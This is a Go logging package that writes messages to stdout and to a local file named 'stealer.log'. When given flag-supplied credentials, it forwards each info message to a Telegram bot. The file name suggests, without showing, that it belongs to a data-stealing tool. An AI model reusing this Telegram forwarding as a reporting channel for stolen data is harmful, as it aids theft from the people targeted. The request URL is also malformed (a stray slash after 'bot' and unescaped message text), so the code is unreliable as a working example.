// Package log writes logging messages to stdout, file and telegram
package log

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"

	"github.com/sirupsen/logrus"
)

var (
	apiKey *string
	chatId *string
)

func init() {
	apiKey = flag.String("telegram-apikey", "", "Telegram API key to send a message.")
	chatId = flag.String("telegram-chatid", "", "Telegram chat ID whose messages can be sent with given API key.")
}

type Logger struct {
	logger *logrus.Logger
	apiKey string
	chatId string
}

func New() *Logger {
	logger := logrus.New()

	// Default configuration
	timestampFormat := "02-01-2006 15:04:05"
	logger.Formatter = &logrus.TextFormatter{
		TimestampFormat: timestampFormat,
		FullTimestamp:   true,
	}
	if f, err := os.OpenFile("./stealer.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666); err == nil {
		logger.Out = io.MultiWriter(f, os.Stdout)
	} else {
		fmt.Println("Failed to open a log file: you can miss important log.")
		logger.Out = os.Stdout
	}
	logger.SetLevel(logrus.InfoLevel)
	return &Logger{logger: logger, apiKey: *apiKey, chatId: *chatId}
}

// Info logs info-level
func (l *Logger) Info(args ...interface{}) {
	l.logger.Info(args...)
	go l.sendTelegramMsg(fmt.Sprint(args...))
}

// Infof logs info-level with format
func (l *Logger) Infof(format string, args ...interface{}) {
	l.logger.Infof(format, args...)
	go l.sendTelegramMsg(fmt.Sprintf(format, args...))
}

func (l *Logger) sendTelegramMsg(message string) {
	if l.apiKey == "" || l.chatId == "" {
		return
	}
	http.Get(fmt.Sprintf("https://api.telegram.org/bot/%s/sendMessage?chat_id=%s&text=%s", l.apiKey, l.chatId, message))
}
